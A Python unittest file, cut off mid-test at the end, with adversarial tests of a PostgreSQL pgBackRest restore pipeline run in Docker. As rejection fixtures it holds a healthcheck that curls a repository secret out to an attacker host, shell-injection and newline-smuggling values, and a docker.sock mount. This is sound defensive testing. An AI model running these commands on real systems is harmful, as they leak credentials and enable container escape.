#!/usr/bin/env python3
"""Focused adversarial tests for PostgreSQL restore trust boundaries."""

from __future__ import annotations

import hashlib
import json
import stat
import subprocess
import sys
import tempfile
import unittest
from datetime import datetime, timedelta, timezone
from pathlib import Path
from unittest.mock import patch

import scripts.postgres_restore_inventory_exporter as inventory_exporter
import scripts.postgres_restore_generation as restore_generation
import scripts.postgres_restore_provider_inventory as provider_inventory
import scripts.postgres_restore_runner as restore_runner
from scripts.postgres_restore_generation import (
    CLEAN_ENVIRONMENT,
    GenerationError,
    GenerationState,
    ProviderPolicy,
    admit_restore_container,
    authorize_and_start_target,
    build_pgbackrest_config,
    load_provider_policy,
    parse_descriptor_owned_bytes,
    project_state,
    require_approved_manifest,
    strict_json_object,
    validate_exclusive_target,
    validate_locked_measurement,
    validate_owned_metadata,
    validate_repository_secret,
    validate_recovery_evidence,
    validate_restore_container,
    validate_restore_acceptance,
)
from scripts.postgres_restore_guard import (
    GuardError,
    parse_selected_info_value,
    scan_forbidden_identifiers,
    stable_image_identity,
    validate_container,
    validate_generation_names,
    validate_network,
    validate_volume,
)
from scripts.postgres_restore_host_inventory import (
    HostInventoryError,
    container_execution_identity,
    strict_docker_json,
    validate_host_inventory,
    validate_sealed_target,
)
from scripts.postgres_restore_git_seal import MEMBERS, SealError, validate_member
from scripts.postgres_restore_image_identity import IdentityError, measure_container
from scripts.postgres_restore_inventory_exporter import (
    ExporterError,
    canonical_executable_target,
    aggregate_task_security,
    container_capability_record,
    next_weekly_slots,
    process_security_state,
    record_sha256,
    retention_policy,
    validate_capability_inventory,
    validate_effective_unit_properties,
    validate_job_policy,
    user_unit_roots,
)
from scripts.postgres_restore_isolation_gate import (
    IsolationGateError,
    canonical_operation_request,
    evaluate_collected_packet,
)
from scripts.postgres_restore_provider_inventory import (
    ProviderInventoryError,
    evaluate_broker_response,
    evaluate_provider_state,
    expected_locked_rules,
    secure_read_fd,
)
from scripts.postgres_restore_retention import (
    RetentionError,
    canonical_json,
    parse_canonical_packet,
    sanitized_consumer_fields,
    validate_accepted_binding,
    validate_weekly_schedule,
)
from scripts.postgres_restore_runner import (
    RunnerError,
    command_for_mode,
    load_sealed_dependencies,
    parse_database_secret,
    role_lifecycle_sql,
    sealed_text_git_oid,
    require_pristine_rootfs,
    require_unchanged_execution_identity,
    validate_runner_inspection,
    validate_target_container,
)
from scripts.postgres_restore_status_gate import (
    StatusGateError,
    execute_status_gate,
)
from scripts.postgres_restore_transaction_probe import ProbeError, verify_probe_payload


ROOT = Path(__file__).resolve().parents[1]
SCRIPTS = ROOT / "scripts"
load_sealed_dependencies()


def sha256_bytes(value: bytes) -> str:
    return hashlib.sha256(value).hexdigest()


def approved_image_manifest() -> dict[str, object]:
    repo_digest = "registry.example/postgres@sha256:" + "1" * 64
    return {
        "schema_version": 1,
        "status": "APPROVED",
        "image_reference": repo_digest,
        "repo_digest": repo_digest,
        "config_id": "sha256:" + "2" * 64,
        "os": "linux",
        "architecture": "amd64",
        "image_environment": [
            "PGDATA=/var/lib/postgresql/data",
            "PATH=/usr/bin",
        ],
        "healthcheck": None,
        "postgres_pgdata": "/var/lib/postgresql/data",
        "postgres_version": "16",
        "pgbackrest_version": "2.59.0",
        "pgbackrest_binary_sha256": "3" * 64,
        "build_artifact_sha256": "4" * 64,
        "reviewed_at_utc": "2026-07-31T08:00:00Z",
        "reviewed_by": "reviewer",
    }


def approved_runner_manifest() -> dict[str, object]:
    runner_repo = "registry.example/runner@sha256:" + "5" * 64
    target_repo = "registry.example/postgres@sha256:" + "1" * 64
    return {
        "schema_version": 3,
        "status": "APPROVED",
        "repo_digest": runner_repo,
        "config_id": "sha256:" + "6" * 64,
        "os": "linux",
        "architecture": "amd64",
        "image_environment": ["PATH=/usr/bin"],
        "image_labels": {"org.opencontainers.image.revision": "sealed"},
        "runtime": "runc",
        "apparmor_profile": "docker-default",
        "masked_paths": ["/proc/kcore"],
        "readonly_paths": ["/proc/asound"],
        "readonly_rootfs": True,
        "tmpfs": None,
        "healthcheck": None,
        "log_config": {"Type": "json-file", "Config": {}},
        "execution_gate_entrypoint": "/usr/local/libexec/adapteng-postgres-restore-exec-gate",
        "psql_entrypoint": "/usr/lib/postgresql/16/bin/psql",
        "probe_argv": ["--no-psqlrc", "-v", "ON_ERROR_STOP=1"],
        "database_environment": {
            "runner_fixed": {
                "PGDATABASE": "adapteng_ops",
                "PGPORT": "5432",
                "PGOPTIONS": "-c role=postgres",
                "PGSSLMODE": "disable",
                "PGUSER": "postgres_restore_runner",
            },
            "bootstrap_fixed": {
                "PGDATABASE": "postgres",
                "PGPORT": "5432",
                "PGOPTIONS": "",
                "PGSSLMODE": "disable",
                "PGUSER": "postgres",
            },
            "host_template": "adapteng-db-{generation_lower}",
        },
        "migration_entrypoint": "/opt/automation/migration-runner",
        "collector_entrypoint": "/opt/automation/evidence-collector",
        "bootstrap_entrypoint": "/usr/lib/postgresql/16/bin/psql",
        "bootstrap_argv": [
            "--dbname=postgres",
            "--no-psqlrc",
            "-v",
            "ON_ERROR_STOP=1",
        ],
        "migration_commands": {
            "status": ["migration-status"],
            "apply-007": ["apply-007"],
            "apply-drive-008": ["apply-drive-008"],
        },
        "collector_commands": {
            "capture-runtime": [
                "capture-runtime-signature",
                "--database",
                "adapteng_ops",
                "--output",
                "-",
            ],
            "capture-catalog": [
                "capture-catalog-signature",
                "--database",
                "adapteng_ops",
                "--output",
                "-",
            ],
        },
        "target": {
            "repo_digest": target_repo,
            "config_id": "sha256:" + "2" * 64,
            "path": "/usr/local/bin/docker-entrypoint.sh",
            "entrypoint": ["/usr/local/bin/docker-entrypoint.sh"],
            "cmd": ["postgres"],
            "user": "postgres",
            "working_dir": "",
            "image_environment": [
                "PGDATA=/var/lib/postgresql/data",
                "PATH=/usr/bin",
            ],
            "labels": {
                "adapteng.restore.purpose": "postgres-restore-rehearsal"
            },
            "hostname_template": "{target_name}",
            "runtime": "runc",
            "apparmor_profile": "docker-default",
            "masked_paths": ["/proc/kcore"],
            "readonly_paths": ["/proc/asound"],
            "readonly_rootfs": True,
            "tmpfs": {
                "/tmp": "rw,noexec,nosuid,nodev,size=64m,mode=1777",
                "/var/run/postgresql": "rw,noexec,nosuid,nodev,size=16m,mode=3775",
            },
            "healthcheck": None,
            "log_config": {"Type": "json-file", "Config": {}},
        },
    }


def names(generation: str = "A") -> dict[str, str]:
    suffix = generation.lower()
    return {
        "recovery_container": f"adapteng-recover-{suffix}",
        "final_container": f"adapteng-db-{suffix}",
        "volume": f"adapteng-restore-{suffix}",
        "bootstrap_network": "pg-restore-bootstrap",
        "locked_network": "pg-rehearsal",
        "restore_pg1_path": f"/restore/{suffix}/pgdata",
    }


def selected_info(label: str = "20260731-080000F") -> list[dict[str, object]]:
    return [
        {
            "status": {"code": 0, "message": "ok"},
            "backup": [
                {
                    "label": label,
                    "type": "full",
                    "error": False,
                    "archive": {"start": "0001", "stop": "0002"},
                    "timestamp": {"stop": 1785484800},
                }
            ],
        }
    ]


def generation_state() -> GenerationState:
    return GenerationState(
        generation="A",
        procedure_manifest_sha256="1" * 64,
        image_config_id="sha256:" + "2" * 64,
        image_repo_digest="registry.example/postgres@sha256:" + "1" * 64,
        image_environment_sha256=sha256_bytes(
            canonical_json(approved_image_manifest()["image_environment"])
        ),
        recovery_container="adapteng-recover-a",
        recovery_container_id="d" * 64,
        final_container="adapteng-db-a",
        final_container_id="e" * 64,
        volume="adapteng-restore-a",
        bootstrap_network="pg-restore-bootstrap",
        locked_network="pg-rehearsal",
        restore_pg1_path="/restore/a/pgdata",
        database_pgdata="/var/lib/postgresql/data",
        repository_endpoint="s3.eu-central-003.backblazeb2.com",
        repository_bucket="rehearsal",
        repository_region="eu-central-003",
        repository_path="/adapteng-ops",
        restore_key_attestation_sha256="7" * 64,
        stanza="adapteng-ops",
        repo="1",
        selected_set_ref_sha256="8" * 64,
        selected_set_info_sha256="9" * 64,
        completed_at="2026-07-31T08:00:00Z",
        inventory_sha256="a" * 64,
        measured_image_identity_sha256="b" * 64,
        cloud_instance_id_sha256="c" * 64,
    )


def runner_environment() -> dict[str, str]:
    return {
        "PGDATABASE": "adapteng_ops",
        "PGPORT": "5432",
        "PGOPTIONS": "-c role=postgres",
        "PGSSLMODE": "disable",
        "PGUSER": "postgres_restore_runner",
        "PGHOST": "adapteng-db-a",
        "PGPASSWORD": "abcdefghijklmnopqrstuvwxyzABCDEF",
    }


def safe_host_config(
    network: str,
    *,
    readonly_rootfs: bool = False,
    tmpfs: dict[str, str] | None = None,
) -> dict[str, object]:
    return {
        "NetworkMode": network,
        "PortBindings": {},
        "Privileged": False,
        "PublishAllPorts": False,
        "ReadonlyRootfs": readonly_rootfs,
        "AutoRemove": False,
        "PidMode": "",
        "IpcMode": "private",
        "UTSMode": "",
        "UsernsMode": "",
        "CgroupnsMode": "private",
        "OomKillDisable": False,
        "Init": False,
        "RestartPolicy": {"Name": "no", "MaximumRetryCount": 0},
        "Binds": None,
        "CapAdd": None,
        "CapDrop": None,
        "Devices": [],
        "DeviceRequests": None,
        "Dns": [],
        "DnsOptions": [],
        "DnsSearch": [],
        "ExtraHosts": None,
        "Links": None,
        "SecurityOpt": None,
        "VolumesFrom": None,
        "GroupAdd": None,
        "Sysctls": None,
        "Tmpfs": tmpfs,
        "Ulimits": None,
        "CgroupParent": "",
        "Runtime": "runc",
        "LogConfig": {"Type": "json-file", "Config": {}},
        "MaskedPaths": ["/proc/kcore"],
        "ReadonlyPaths": ["/proc/asound"],
    }


def runner_container(
    *, container_id: str = "runner-id", entrypoint: str | None = None
) -> dict[str, object]:
    manifest = approved_runner_manifest()
    entrypoint = entrypoint or str(manifest["psql_entrypoint"])
    environment = runner_environment()
    return {
        "Id": container_id,
        "Name": "/adapteng-runner-a-probe",
        "Image": manifest["config_id"],
        "AppArmorProfile": "docker-default",
        "State": {
            "Status": "created",
            "Running": False,
            "Pid": 0,
            "ExitCode": 0,
            "Paused": False,
            "Restarting": False,
            "Dead": False,
        },
        "RestartCount": 0,
        "Config": {
            "Image": manifest["repo_digest"],
            "Entrypoint": [manifest["execution_gate_entrypoint"]],
            "Cmd": [entrypoint, *manifest["probe_argv"]],
            "Labels": {
                **manifest["image_labels"],
                "adapteng.restore.purpose": "postgres-restore-rehearsal",
                "adapteng.restore.component": "sealed-sql-runner",
                "adapteng.restore.generation": "A",
            },
            "Env": [
                "PATH=/usr/bin",
                *(f"{key}={value}" for key, value in environment.items()),
            ],
            "Hostname": "adapteng-runner-a-probe",
            "User": "65532:65532",
            "WorkingDir": "",
            "AttachStdin": True,
            "AttachStdout": True,
            "AttachStderr": True,
            "Tty": False,
            "OpenStdin": True,
            "StdinOnce": False,
        },
        "HostConfig": safe_host_config(
            "pg-rehearsal", readonly_rootfs=True
        ),
        "NetworkSettings": {
            "Networks": {
                "pg-rehearsal": {
                    "NetworkID": "locked-id",
                    "EndpointID": "runner-endpoint",
                    "Aliases": ["adapteng-runner-a-probe"],
                }
            }
        },
        "Mounts": [],
    }


def target_container(
    *, running: bool = True, target_kind: str = "final", container_id: str = "d" * 64
) -> dict[str, object]:
    manifest = approved_runner_manifest()
    name = "adapteng-db-a" if target_kind == "final" else "adapteng-recover-a"
    return {
        "Id": container_id,
        "Name": f"/{name}",
        "Image": manifest["target"]["config_id"],
        "Path": manifest["target"]["path"],
        "State": {
            "Status": "running" if running else "created",
            "Running": running,
            "Pid": 123 if running else 0,
            "ExitCode": 0,
            "Error": "",
            "StartedAt": "2026-07-31T08:00:00Z" if running else "0001-01-01T00:00:00Z",
            "FinishedAt": "0001-01-01T00:00:00Z",
            "Paused": False,
            "Restarting": False,
            "OOMKilled": False,
            "Dead": False,
        },
        "RestartCount": 0,
        "AppArmorProfile": "docker-default",
        "Config": {
            "Image": manifest["target"]["repo_digest"],
            "Entrypoint": manifest["target"]["entrypoint"],
            "Cmd": manifest["target"]["cmd"],
            "Env": manifest["target"]["image_environment"],
            "Labels": manifest["target"]["labels"],
            "Hostname": name,
            "User": "postgres",
            "WorkingDir": "",
            "AttachStdin": False,
            "AttachStdout": True,
            "AttachStderr": True,
            "Tty": False,
            "OpenStdin": False,
            "StdinOnce": False,
        },
        "HostConfig": safe_host_config(
            "none",
            readonly_rootfs=True,
            tmpfs=dict(manifest["target"]["tmpfs"]),
        ),
        "NetworkSettings": {
            "Networks": {
                "pg-rehearsal": {
                    "NetworkID": "locked-id",
                    "EndpointID": f"{target_kind}-endpoint",
                    "Aliases": [name, container_id[:12]],
                    "IPAddress": "172.30.0.10",
                }
            }
        },
        "Mounts": [
            {
                "Type": "volume",
                "Name": "adapteng-restore-a",
                "Source": "/var/lib/docker/volumes/adapteng-restore-a/_data",
                "Destination": "/var/lib/postgresql/data",
                "RW": True,
            }
        ],
    }


def image_objects() -> list[dict[str, object]]:
    manifest = approved_runner_manifest()
    return [
        {
            "Id": manifest["config_id"],
            "RepoDigests": [manifest["repo_digest"]],
            "Os": "linux",
            "Architecture": "amd64",
            "Config": {"User": "65532:65532"},
        },
        {
            "Id": manifest["target"]["config_id"],
            "RepoDigests": [manifest["target"]["repo_digest"]],
            "Os": "linux",
            "Architecture": "amd64",
            "Config": {"User": "postgres"},
        },
    ]


def network_objects() -> list[dict[str, object]]:
    return [
        {"Name": "bridge", "Internal": False, "Driver": "bridge", "Scope": "local"},
        {"Name": "host", "Internal": False, "Driver": "host", "Scope": "local"},
        {"Name": "none", "Internal": True, "Driver": "null", "Scope": "local"},
        {
            "Name": "pg-rehearsal",
            "Internal": True,
            "Driver": "bridge",
            "Scope": "local",
        },
    ]


class ProductionPathTests(unittest.TestCase):
    def test_production_modules_have_no_test_bypass_names(self) -> None:
        forbidden = (
            "POSTGRES_RESTORE_TEST",
            "TEST_MODE",
            "TEST_ROOT",
            "TEST_DOCKER",
            "--now",
        )
        modules = tuple(path.name for path in SCRIPTS.glob("postgres_restore_*.py"))
        for module in modules:
            text = (SCRIPTS / module).read_text(encoding="utf-8")
            for token in forbidden:
                self.assertNotIn(token, text, f"{module} contains {token}")

    def test_restore_wrapper_has_no_caller_dotenv_or_shell_source(self) -> None:
        text = (SCRIPTS / "postgres_restore_generation.py").read_text(
            encoding="utf-8"
        )
        self.assertNotIn("restore.env", text)
        self.assertNotIn("\nsource ", text)
        self.assertNotIn("\n. ", text)
        self.assertNotIn("--restore-env", text)
        self.assertIn("/run/secrets/postgres-restore-repository.json", text)

    def test_helper_environment_is_cleared_and_allowlisted(self) -> None:
        self.assertEqual(set(CLEAN_ENVIRONMENT), {"PATH", "LANG", "LC_ALL"})
        for prefix in ("PGBACKREST_", "PG", "AWS_", "B2_", "DOCKER_"):
            self.assertFalse(any(key.startswith(prefix) for key in CLEAN_ENVIRONMENT))


class RestoreConfigurationTests(unittest.TestCase):
    def setUp(self) -> None:
        self.state = generation_state()
        self.repository_capability = {
            "schema_version": 1,
            "endpoint_sha256": sha256_bytes(
                self.state.repository_endpoint.encode("ascii")
            ),
            "bucket_sha256": sha256_bytes(
                self.state.repository_bucket.encode("ascii")
            ),
            "region_sha256": sha256_bytes(
                self.state.repository_region.encode("ascii")
            ),
            "s3_key": "A" * 32,
            "s3_key_secret": "B" * 32,
            "cipher_pass": "C" * 32,
        }

    def restore_fixture(
        self,
    ) -> tuple[dict[str, str], list[str], dict[str, object], dict[str, object]]:
        secrets = validate_repository_secret(
            canonical_json(self.repository_capability), self.state
        )
        restore_command = [
            "--config=/etc/pgbackrest/pgbackrest.conf",
            "--stanza=adapteng-ops",
            "--repo=1",
            "--pg1-path=/restore/a/pgdata",
            "--set=20260731-080000F",
            "--type=immediate",
            "--target-action=promote",
            "restore",
        ]
        image_environment = approved_image_manifest()["image_environment"]
        container: dict[str, object] = {
            "Id": "restore-id",
            "Name": "/adapteng-pgbackrest-a",
            "Image": self.state.image_config_id,
            "Path": "pgbackrest",
            "Args": restore_command,
            "State": {"Running": False},
            "Config": {
                "Image": self.state.image_repo_digest,
                "Hostname": "adapteng-pgbackrest-a",
                "User": "postgres",
                "Entrypoint": ["pgbackrest"],
                "Cmd": restore_command,
                "Env": [
                    *image_environment,
                    *(f"{key}={value}" for key, value in sorted(secrets.items())),
                ],
                "Healthcheck": None,
            },
            "HostConfig": safe_host_config(self.state.bootstrap_network),
            "NetworkSettings": {
                "Networks": {self.state.bootstrap_network: {}},
            },
            "Mounts": [
                {
                    "Type": "volume",
                    "Name": self.state.volume,
                    "Destination": self.state.restore_pg1_path,
                    "RW": True,
                },
                {
                    "Type": "bind",
                    "Source": str(Path("/secure/pgbackrest.conf")),
                    "Destination": "/etc/pgbackrest/pgbackrest.conf",
                    "RW": False,
                },
            ],
        }
        image: dict[str, object] = {
            "Id": self.state.image_config_id,
            "RepoDigests": [self.state.image_repo_digest],
            "Os": "linux",
            "Architecture": "amd64",
            "Config": {
                "Env": image_environment,
                "User": "postgres",
                "Healthcheck": None,
            },
        }
        return secrets, restore_command, container, image

    def test_public_pgbackrest_config_is_generated_from_exact_state(self) -> None:
        config = build_pgbackrest_config(self.state).decode("ascii")
        self.assertIn("repo1-type=s3", config)
        self.assertIn("repo1-path=/adapteng-ops", config)
        self.assertIn("repo1-cipher-type=aes-256-cbc", config)
        self.assertIn("[adapteng-ops]", config)
        self.assertNotIn("PGBACKREST_", config)

    def test_secret_capability_accepts_only_exact_json_map(self) -> None:
        values = validate_repository_secret(
            canonical_json(self.repository_capability), self.state
        )
        self.assertEqual(
            set(values),
            {
                "PGBACKREST_REPO1_S3_KEY",
                "PGBACKREST_REPO1_S3_KEY_SECRET",
                "PGBACKREST_REPO1_CIPHER_PASS",
            },
        )
        self.assertNotIn("endpoint", "\n".join(values.values()))

    def test_repo_endpoint_bucket_region_and_cipher_overrides_are_rejected(self) -> None:
        attacks = [
            {**self.repository_capability, "endpoint_sha256": "0" * 64},
            {**self.repository_capability, "bucket_sha256": "0" * 64},
            {**self.repository_capability, "region_sha256": "0" * 64},
            {**self.repository_capability, "repo1-type": "posix"},
            {**self.repository_capability, "stanza": "other"},
            {**self.repository_capability, "pg1-path": "/production"},
            {**self.repository_capability, "cipher_pass": "short"},
        ]
        for attack in attacks:
            with self.subTest(attack=set(attack) - set(self.repository_capability)):
                with self.assertRaises(GenerationError):
                    validate_repository_secret(canonical_json(attack), self.state)

    def test_duplicate_comment_quote_expansion_and_newline_attacks_are_rejected(self) -> None:
        duplicate = (
            b'{"schema_version":1,"schema_version":1,"endpoint_sha256":"'
            + b"0" * 64
            + b'"}'
        )
        with self.assertRaises(GenerationError):
            strict_json_object(duplicate, "secret")
        for value in ("$(id)", "${HOME}", "quoted value", "A" * 32 + "\nOVERRIDE=x"):
            attack = {**self.repository_capability, "s3_key": value}
            with self.assertRaises(GenerationError):
                validate_repository_secret(canonical_json(attack), self.state)
        with self.assertRaises(GenerationError):
            validate_repository_secret(b"# comment\n{}", self.state)

    def test_restore_container_is_measured_before_same_id_start(self) -> None:
        secrets, restore_command, container, image = self.restore_fixture()
        identity = validate_restore_container(
            container=container,
            image=image,
            state=self.state,
            container_id="restore-id",
            container_name="adapteng-pgbackrest-a",
            restore_command=restore_command,
            config_path=Path("/secure/pgbackrest.conf"),
            secrets=secrets,
        )
        self.assertNotIn("A" * 32, json.dumps(identity))
        self.assertRegex(
            identity["container_raw_inspect_sha256"], r"^[0-9a-f]{64}$"
        )
        self.assertRegex(identity["image_raw_inspect_sha256"], r"^[0-9a-f]{64}$")

        attacks = [
            {**container, "Id": "replacement"},
            {**container, "Path": "sh"},
            {
                **container,
                "Config": {
                    **container["Config"],
                    "Env": [
                        *container["Config"]["Env"],
                        "PGBACKREST_REPO1_TYPE=posix",
                    ],
                },
            },
            {
                **container,
                "HostConfig": {
                    **container["HostConfig"],
                    "NetworkMode": "bridge",
                },
            },
            {
                **container,
                "Mounts": [
                    *container["Mounts"],
                    {
                        "Type": "bind",
                        "Source": "/var/run/docker.sock",
                        "Destination": "/var/run/docker.sock",
                        "RW": True,
                    },
                ],
            },
        ]
        for attack in attacks:
            with self.assertRaises(GenerationError):
                validate_restore_container(
                    container=attack,
                    image=image,
                    state=self.state,
                    container_id="restore-id",
                    container_name="adapteng-pgbackrest-a",
                    restore_command=restore_command,
                    config_path=Path("/secure/pgbackrest.conf"),
                    secrets=secrets,
                )

    def test_restore_admission_rejects_inherited_and_drifted_healthchecks(self) -> None:
        secrets, command, container, image = self.restore_fixture()

        def old_projection(
            candidate: dict[str, object], candidate_image: dict[str, object]
        ) -> dict[str, object]:
            config = candidate["Config"]
            assert isinstance(config, dict)
            image_config = candidate_image["Config"]
            assert isinstance(image_config, dict)
            return {
                "path": candidate["Path"],
                "args": candidate["Args"],
                "environment": config["Env"],
                "image_environment": image_config["Env"],
                "network": candidate["HostConfig"],
                "mounts": candidate["Mounts"],
            }

        baseline_projection = old_projection(container, image)
        attacks: list[tuple[dict[str, object], dict[str, object]]] = []
        for healthcheck in (
            {
                "Test": [
                    "CMD-SHELL",
                    "curl -s https://attacker.invalid/?k=$"
                    "PGBACKREST_REPO1_S3_KEY_SECRET",
                ]
            },
            {"Test": ["CMD", "curl", "https://attacker.invalid/"]},
            {},
        ):
            attack = json.loads(json.dumps(container))
            attack["Config"]["Healthcheck"] = healthcheck
            attacks.append((attack, image))
        inherited = json.loads(json.dumps(image))
        inherited["Config"]["Healthcheck"] = {"Test": ["CMD-SHELL", "id"]}
        attacks.append((container, inherited))
        case_variant = json.loads(json.dumps(container))
        case_variant["Config"]["healthcheck"] = {"Test": ["CMD", "id"]}
        attacks.append((case_variant, image))

        for attack_container, attack_image in attacks:
            with self.subTest():
                self.assertEqual(
                    old_projection(attack_container, attack_image),
                    baseline_projection,
                )
                with self.assertRaisesRegex(
                    GenerationError,
                    "execution identity is not supported",
                ) as caught:
                    validate_restore_container(
                        container=attack_container,
                        image=attack_image,
                        state=self.state,
                        container_id="restore-id",
                        container_name="adapteng-pgbackrest-a",
                        restore_command=command,
                        config_path=Path("/secure/pgbackrest.conf"),
                        secrets=secrets,
                    )
                self.assertNotIn("attacker.invalid", str(caught.exception))

        inspected = [
            json.loads(json.dumps(container)),
            json.loads(json.dumps(image)),
            json.loads(json.dumps(container)),
            json.loads(json.dumps(image)),
        ]
        inspected[2]["Config"]["Healthcheck"] = {"Test": ["CMD-SHELL", "id"]}
        self.assertEqual(
            old_projection(inspected[0], inspected[1]),
            old_projection(inspected[2], inspected[3]),
        )

        def inspect(kind: str, _reference: str) -> dict[str, object]:
            expected = "container" if len(inspected) in {4, 2} else "image"
            self.assertEqual(kind, expected)
            return inspected.pop(0)

        with self.assertRaises(GenerationError):
            admit_restore_container(
                state=self.state,
                container_id="restore-id",
                container_name="adapteng-pgbackrest-a",
                restore_command=command,
                config_path=Path("/secure/pgbackrest.conf"),
                secrets=secrets,
                inspect=inspect,
            )
        self.assertEqual(inspected, [])

        raw_drift = [
            json.loads(json.dumps(container)),
            json.loads(json.dumps(image)),
            json.loads(json.dumps(container)),
            json.loads(json.dumps(image)),
        ]
        raw_drift[2]["Config"]["StopSignal"] = "SIGTERM"

        def inspect_drift(_kind: str, _reference: str) -> dict[str, object]:
            return raw_drift.pop(0)

        with self.assertRaisesRegex(
            GenerationError, "identity changed before start"
        ):
            admit_restore_container(
                state=self.state,
                container_id="restore-id",
                container_name="adapteng-pgbackrest-a",
                restore_command=command,
                config_path=Path("/secure/pgbackrest.conf"),
                secrets=secrets,
                inspect=inspect_drift,
            )
        self.assertEqual(raw_drift, [])

    def test_restore_docker_parser_rejects_duplicate_healthcheck_keys(self) -> None:
        payload = (
            '[{"Config":{"Healthcheck":null,'
            '"Healthcheck":{"Test":["CMD","id"]}}}]'
        )
        self.assertEqual(
            json.loads(payload)[0]["Config"]["Healthcheck"]["Test"],
            ["CMD", "id"],
        )

        def execute(
            *_args: object, **_kwargs: object
        ) -> subprocess.CompletedProcess[str]:
            return subprocess.CompletedProcess([], 0, stdout=payload, stderr="")

        with self.assertRaisesRegex(GenerationError, "invalid JSON"):
            restore_generation.docker_inspect_one(
                "container", "restore-id", execute=execute
            )


class GuardBoundaryTests(unittest.TestCase):
    def test_generation_names_are_exact(self) -> None:
        self.assertEqual(validate_generation_names(names(), "A"), names())
        wrong = names()
        wrong["volume"] = "adapteng-restore-b"
        with self.assertRaises(GuardError):
            validate_generation_names(wrong, "A")

    def test_wrong_network_and_production_identifier_are_rejected(self) -> None:
        with self.assertRaises(GuardError):
            validate_network(
                {
                    "Name": "pg-rehearsal",
                    "Internal": False,
                    "Driver": "bridge",
                    "Scope": "local",
                    "Options": {},
                },
                "pg-rehearsal",
                True,
            )
        with self.assertRaises(GuardError):
            scan_forbidden_identifiers(
                {"adapteng-ops-db", "postgres-adapteng-ops"},
                ["endpoint=adapteng-ops-db"],
            )

    def test_sql_container_rejects_repository_credentials_and_extra_mount(self) -> None:
        container = target_container(
            running=False, target_kind="recovery", container_id="d" * 64
        )
        container["NetworkSettings"]["Networks"] = {"none": {}}
        container["Config"]["Env"] = [
            "PGBACKREST_REPO1_S3_KEY_SECRET=forbidden"
        ]
        with self.assertRaises(GuardError):
            validate_container(
                container,
                "adapteng-recover-a",
                "none",
                "adapteng-restore-a",
                "/var/lib/postgresql/data",
            )

        healthcheck = target_container(
            running=False, target_kind="recovery", container_id="d" * 64
        )
        healthcheck["NetworkSettings"]["Networks"] = {"none": {}}
        healthcheck["Config"]["Healthcheck"] = {"Test": ["CMD-SHELL", "id"]}
        with self.assertRaisesRegex(GuardError, "execution identity is unsafe"):
            validate_container(
                healthcheck,
                "adapteng-recover-a",
                "none",
                "adapteng-restore-a",
                "/var/lib/postgresql/data",
            )
        container["Config"]["Env"] = []
        container["Mounts"].append(
            {
                "Type": "bind",
                "Source": "/secure",
                "Destination": "/secure",
                "RW": True,
            }
        )
        with self.assertRaises(GuardError):
            validate_container(
                container,
                "adapteng-recover-a",
                "none",
                "adapteng-restore-a",
                "/var/lib/postgresql/data",
            )

    def test_selected_set_is_bound_to_exact_info(self) -> None:
        label = "20260731-080000F"
        digest, completed = parse_selected_info_value(selected_info(label), label)
        self.assertEqual(digest, sha256_bytes(label.encode()))
        self.assertEqual(completed, "2026-07-31T08:00:00Z")
        with self.assertRaises(GuardError):
            parse_selected_info_value(selected_info(label), "other-set")

    def test_wrong_volume_rejected_before_path_access(self) -> None:
        volume = {
            "Name": "adapteng-restore-a",
            "Driver": "local",
            "Scope": "local",
            "Options": {},
            "Labels": {
                "adapteng.restore.generation": "B",
                "adapteng.restore.new": "true",
                "adapteng.restore.purpose": "postgres-restore-rehearsal",
            },
            "Mountpoint": "not-used",
        }
        with self.assertRaises(GuardError):
            validate_volume(volume, "adapteng-restore-a", "A")

    def test_image_identity_uses_injected_inspector(self) -> None:
        manifest = approved_image_manifest()
        with tempfile.TemporaryDirectory() as temp:
            path = Path(temp) / "manifest.json"
            raw = canonical_json(manifest)
            path.write_bytes(raw)

            def inspect(*args: str) -> object:
                if args[:2] == ("container", "inspect"):
                    return [
                        {
                            "Id": "container-id",
                            "Image": manifest["config_id"],
                            "Platform": "linux",
                            "Config": {
                                "Image": manifest["repo_digest"],
                                "Healthcheck": None,
                            },
                        }
                    ]
                return [
                    {
                        "Id": manifest["config_id"],
                        "RepoDigests": [manifest["repo_digest"]],
                        "Os": "linux",
                        "Architecture": "amd64",
                        "Config": {
                            "Env": manifest["image_environment"],
                            "Healthcheck": None,
                        },
                    }
                ]

            packet = measure_container(
                "candidate", path, sha256_bytes(raw), inspect=inspect
            )
            self.assertEqual(packet["status"], "MEASURED_APPROVED")
            self.assertIsNone(packet["healthcheck"])
            self.assertRegex(packet["image_raw_inspect_sha256"], r"^[0-9a-f]{64}$")

            for location in ("container", "image"):
                def hostile_inspect(*args: str) -> object:
                    if args[:2] == ("container", "inspect"):
                        value = {
                            "Id": "container-id",
                            "Image": manifest["config_id"],
                            "Platform": "linux",
                            "Config": {
                                "Image": manifest["repo_digest"],
                                "Healthcheck": None,
                            },
                        }
                        if location == "container":
                            value["Config"]["Healthcheck"] = {
                                "Test": ["CMD-SHELL", "id"]
                            }
                        return [value]
                    value = {
                        "Id": manifest["config_id"],
                        "RepoDigests": [manifest["repo_digest"]],
                        "Os": "linux",
                        "Architecture": "amd64",
                        "Config": {
                            "Env": manifest["image_environment"],
                            "Healthcheck": None,
                        },
                    }
                    if location == "image":
                        value["Config"]["Healthcheck"] = {
                            "Test": ["CMD", "id"]
                        }
                    return [value]

                with self.subTest(location=location):
                    with self.assertRaisesRegex(
                        IdentityError, "healthcheck identity is not exact"
                    ):
                        measure_container(
                            "candidate",
                            path,
                            sha256_bytes(raw),
                            inspect=hostile_inspect,
                        )

    def test_multiple_image_digest_is_rejected(self) -> None:
        manifest = approved_image_manifest()
        container = {
            "Id": "id",
            "Name": "/name",
            "State": {"Running": False},
            "Image": manifest["config_id"],
            "Config": {"Image": manifest["repo_digest"]},
        }
        image = {
            "Id": manifest["config_id"],
            "RepoDigests": [manifest["repo_digest"], "other@sha256:" + "9" * 64],
            "Os": "linux",
            "Architecture": "amd64",
        }
        with self.assertRaises(RunnerError):
            validate_runner_inspection(
                container,
                image,
                approved_runner_manifest(),
                expected_id="id",
                expected_name="name",
                entrypoint="/bin/true",
                argv=[],
                environment={},
            )

    def test_common_image_identity_excludes_unique_container_binding(self) -> None:
        first = {"config_id": "same", "container_ref_sha256": "a" * 64}
        second = {"config_id": "same", "container_ref_sha256": "b" * 64}
        self.assertEqual(stable_image_identity(first), stable_image_identity(second))


class DescriptorOwnershipTests(unittest.TestCase):
    def test_symlink_owner_and_mode_attacks_are_rejected(self) -> None:
        for values in (
            (0, stat.S_IFREG | 0o600, True),
            (1000, stat.S_IFREG | 0o600, False),
            (0, stat.S_IFREG | 0o644, False),
        ):
